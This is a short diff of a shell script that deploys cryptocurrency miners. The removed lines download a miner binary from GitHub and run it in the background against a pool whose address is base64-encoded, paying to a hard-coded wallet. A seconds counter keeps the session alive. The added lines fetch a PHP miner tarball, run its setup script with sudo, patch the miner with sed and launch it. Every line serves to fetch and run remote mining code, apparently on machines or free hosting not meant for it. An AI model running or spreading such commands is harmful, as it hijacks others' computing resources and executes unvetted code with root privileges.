@@ -1,4 +1,7 @@
-wget https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/zig-power2b
-chmod +x zig-power2b
-nohup ./zig-power2b mine-wss "wss://thorough-jaquelin-berakitame-aeabd1e4.koyeb.app/bmEucnBsYW50Lnh5ejo3MDIy" BgFAEEhn9yvubV7iQ6cZxHU2KrdS6oBEY1.VVV x 3 > log 2>&1 &
-i=0; while true; do echo -ne "\r$i seconds"; ((i++)); sleep 1; done
+wget https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/php-power2b.tar.gz
+tar xvf php-power2b.tar.gz
+cd php-power2b
+sudo bash setup.sh
+sed -i "/bcmul/d" miner.php
+sed -i "s|\$scale = gmp_init(\$scaleStr === '' ? '1' : \$scaleStr);|\$scale = gmp_init((string)(int)round(\$diff * 4294967296.0));|" miner.php
+php run.php
